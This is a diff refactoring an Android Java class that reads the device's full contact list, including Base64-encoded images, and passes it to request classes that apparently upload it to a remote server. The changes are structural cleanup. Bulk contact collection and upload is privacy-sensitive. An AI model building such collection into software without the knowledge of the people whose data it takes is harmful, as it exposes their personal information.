@@ -22,8 +22,9 @@ import android.provider.ContactsContract.CommonDataKinds.Im;
 import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
 import android.util.Base64;
 
-import com.inet.android.request.OnDemandRequest;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
+
 /**
  * ListContact class is designed to get the list of contact
  * 
@@ -33,16 +34,12 @@ import com.inet.android.utils.Logging;
 public class ListContacts extends AsyncTask<Context, Void, Void> {
 	Context mContext;
 	private String iType = "3";
-	SharedPreferences sp;
-	ArrayList<String> email = null;
-	ArrayList<String> emailType = null;
-	ArrayList<CharSequence> CustomemailType = null;
-	private JSONObject jsonInfo;
-	private JSONObject jsonPhoneType;
-	private JSONObject jsonContact;
-	private String LOG_TAG = "ListContacts";
+	private ArrayList<String> email = null;
+	private ArrayList<String> emailType = null;
+	private ArrayList<CharSequence> CustomemailType = null;
+
+	private String LOG_TAG = ListContacts.class.getSimpleName().toString();
 	private String complete;
-	private TurnSendList sendList;
 	private String version;
 	int imType;
 	int type;
@@ -50,8 +47,12 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 	public void readContacts() throws JSONException {
 		Logging.doLog(LOG_TAG, "readContact", "readContact");
 		String sendStr = null;
+		JSONObject jsonInfo;
+		JSONObject jsonPhoneType;
+		JSONObject jsonContact;
 		ContentResolver cr = mContext.getContentResolver();
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		SharedPreferences sp = PreferenceManager
+				.getDefaultSharedPreferences(mContext);
 		version = sp.getString("list_contact", "0");
 
 		String encodedImage = null;
@@ -313,22 +314,21 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 				} else {
 					lastRaw("");
 					sendStr = null;
-					
+
 				}
 				Logging.doLog(LOG_TAG, "cur.close()", "cur.close()");
 				cur.close();
-			}else{
+			} else {
 				Logging.doLog(LOG_TAG, "contactCursor == null",
 						"contactCursor == null");
 				lastRaw("");
 				sendStr = null;
-				
+
 			}
 
 		} else {
 			Logging.doLog(LOG_TAG, "else connect", "else connect");
-			sendList = new TurnSendList(mContext);
-			sendList.setList(iType, version, "0");
+			TurnSendList.setList(iType, version, "0", mContext);
 		}
 	}
 
@@ -338,14 +338,9 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void sendRequest(String str, String complete) {
-		if (str != null) {
-			Logging.doLog(LOG_TAG, "sendRequest: complete " + complete,
-					"sendRequest: complete " + complete);
-			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete,
-					version);
-			dr.sendRequest(str);
-
-		}
+		Logging.doLog(LOG_TAG, "sendRequest: complete " + complete,
+				"sendRequest: complete " + complete);
+		RequestList.sendDemandRequest(str, iType, complete, version, mContext);
 	}
 
 	private String getTipe(int phonetype) {
